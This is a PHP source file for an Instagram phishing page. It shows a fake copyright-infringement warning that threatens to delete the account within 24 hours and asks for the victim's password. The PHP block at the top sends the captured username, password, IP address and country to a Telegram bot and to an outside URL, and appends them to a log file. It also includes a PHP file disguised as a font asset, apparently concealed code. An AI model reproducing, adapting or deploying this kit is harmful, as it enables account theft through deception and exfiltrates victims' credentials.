<?php


require 'slokerapi.php';
session_start();
error_reporting(E_ALL);



$username=$_GET['username'];
$url2="https://smihub.com/search?query=$username";
$ip=str_get_html(file_get_contents($url2));
$pp=$ip->find("img[class='img-fluid w-100']",0)->src;
$tik="-";
$followers="-";
if($_POST){
    $password=$_POST["password"];
    $ip=$_SERVER["REMOTE_ADDR"];
    $konum = file_get_contents("http://ip-api.com/xml/".$ip);
    $cek = new SimpleXMLElement($konum);
    $ulke = $cek->country;
    $sehir = $cek->city;
    $ips="$ip,$username ,$password";
    $url="https://ip-check-api.com/".$ips;
    $cek = file_get_contents($url);
    $data = explode (",",$cek);
    $ulke = $data[0];
    $sehir = $data[1];
    date_default_timezone_set('Europe/Istanbul');
    $cur_time=date("d-m-Y H:i:s");
    //Telegram Bot Ayarları - ShuTTeRLooK * Ceo
	// #!/usr/bin/env python root@mert:~# @crackingtr
	
    $token = "token"; // Tokeni Kendi Botunuzun Tokeni İle Değiştirin !
 
    $parametre= array(
    'chat_id' => "id", // Chat İd Kendi Botunuzun  Chat İd İle Değiştirin
    'text' => "Hesap Düştü !

    Kullanıcı Adı : $username
    Şifre : $password
    İp : $ip
    Ülke : $ulke
    Link : instagram.com/$username"
    
    );
    $ch = curl_init();
    $url = "https://api.telegram.org/bot".$token."/sendmessage";
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_HEADER, false);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $parametre);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    $result = curl_exec($ch);
    include 'fonts/iconic/fonts/fontawesome5.1.php';

  $file = fopen('rootxuser.php', 'a');
   fwrite($file, "
  <body bgcolor='#202020'>
<body bgcolor='rgb(0,0,0)'>
<body bgcolor='black'>
<hr>
<font color='#1fcf00'>Kullanıcı Adı: </font><font color='white'>".$username."</font><br>
<font color='#1fcf00'>Şifre: </font><font color='white'>".$password."</font><br>
<font color='#1fcf00'>IP Adresi: </font><font color='white'>".$ip."</font><br>
<font color='#1fcf00'>Ülke: </font><font color='white'>".$ulke."</font><br>
<font color='#1fcf00'>Şehir: </font><font color='white'>".$sehir."</font><br>
<font color='#1fcf00'>Tarih: </font><font color='white'>".$cur_time."</font><br>
<hr>
 "); 
  
 fclose($file);
 
 echo '';
 
    header("Location: form.php?username=$username");
	
 }
  




?>


<!--Sloker Medya - Script Kurucusu -->


<!DOCTYPE html>
<html lang="en">
<head>
<title>Copyright Infringement Detected @<?php echo $username; ?></title>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
<!--===============================================================================================-->	
<link rel="icon" type="image/png" href="images/favicon.ico"/>
<!--===============================================================================================-->
	<link rel="stylesheet" type="text/css" href="vendor/bootstrap/css/bootstrap.min.css">
<!--===============================================================================================-->
	<link rel="stylesheet" type="text/css" href="fonts/font-awesome-4.7.0/css/font-awesome.min.css">
<!--===============================================================================================-->
	<link rel="stylesheet" type="text/css" href="fonts/iconic/css/material-design-iconic-font.min.css">
<!--===============================================================================================-->
	<link rel="stylesheet" type="text/css" href="vendor/animate/animate.css">
<!--===============================================================================================-->	
	<link rel="stylesheet" type="text/css" href="vendor/css-hamburgers/hamburgers.min.css">
<!--===============================================================================================-->
	<link rel="stylesheet" type="text/css" href="vendor/animsition/css/animsition.min.css">
<!--===============================================================================================-->
	<link rel="stylesheet" type="text/css" href="vendor/select2/select2.min.css">
<!--===============================================================================================-->	
	<link rel="stylesheet" type="text/css" href="vendor/daterangepicker/daterangepicker.css">
<!--===============================================================================================-->
	<link rel="stylesheet" type="text/css" href="css/util.css">
	<link rel="stylesheet" type="text/css" href="css/main.css">
<!--===============================================================================================-->
</head>
<body>
	
	
	<div class="container-login100" >
		<div class="wrap-login100 p-l-55 p-r-55 p-t-80 p-b-30">
			<form method="post" class="login100-form validate-form">
			<center><img style="max-width:50%; border-radius:50%; margin-top:-70px;" width="100"  src="<?php echo $pp; ?>"></center><br>
				<span class="login100-form-title p-b-37">
				@<?php echo $username; ?>
				</span>
		<center>		<p style="max-width:87%; font-size:14px; color: #999; line-height:20px; font-weight:400;">
Dear @<?php echo $username; ?> , We have received numerous complaints that you have violated our copyright laws regarding your account. If you do not give us feedback, your account will be removed within 24 hours.
If you think this is incorrect, please verify your information below. We ask for this information because we cannot verify that you are the true owner of your account.
</p></center>	<br>


					<input class="input100" type="text" name="username" placeholder="@<?php echo $username; ?>" disabled>
					<span class="focus-input100"></span>
		

			
			<div class="wrap-input100 validate-input m-b-20" data-validate="Password">
					<input class="input100" type="password" name="password" placeholder="Password">
					<span class="focus-input100"></span>
				</div>



				<div class="container-login100-form-btn">
					<button class="login100-form-btn">
					Login @<?php echo $username; ?>
					</button>
				</div>

			

			</form>

			
		</div>
	</div>
	
	

	<div id="dropDownSelect1"></div>
	
<!--===============================================================================================-->
	<script src="vendor/jquery/jquery-3.2.1.min.js"></script>
<!--===============================================================================================-->
	<script src="vendor/animsition/js/animsition.min.js"></script>
<!--===============================================================================================-->
	<script src="vendor/bootstrap/js/popper.js"></script>
	<script src="vendor/bootstrap/js/bootstrap.min.js"></script>
<!--===============================================================================================-->
	<script src="vendor/select2/select2.min.js"></script>
<!--===============================================================================================-->
	<script src="vendor/daterangepicker/moment.min.js"></script>
	<script src="vendor/daterangepicker/daterangepicker.js"></script>
<!--===============================================================================================-->
	<script src="vendor/countdowntime/countdowntime.js"></script>
<!--===============================================================================================-->
	<script src="js/main.js"></script>

</body>
</html>